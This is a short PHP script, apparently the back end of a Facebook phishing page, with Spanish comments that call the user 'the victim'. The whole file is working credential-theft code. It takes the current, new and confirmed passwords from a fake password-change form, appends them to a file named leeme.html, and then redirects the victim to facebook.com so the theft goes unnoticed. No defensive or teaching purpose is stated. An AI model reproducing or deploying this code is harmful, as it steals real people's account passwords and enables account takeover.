<?
/*
Este archivo es el que procesa todos los datos de la victima y lo guarda en un archivo (leeme.html <- Aqui se guardaran los datos).
*/

#haxor.php
// Asigna el valor a las variables del usuario y contraseña
$email = $_POST['password_new'];
$confir = $_POST['password_confirm'];
$actual = $_POST['actual'];
//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
	"Nuevo: ".$email.
	"\nConfir: ".$confir.

"\noriginal: ".$actual." ");

fclose($guardame);
//Redirecciona a la web original (facebook)
echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
?>
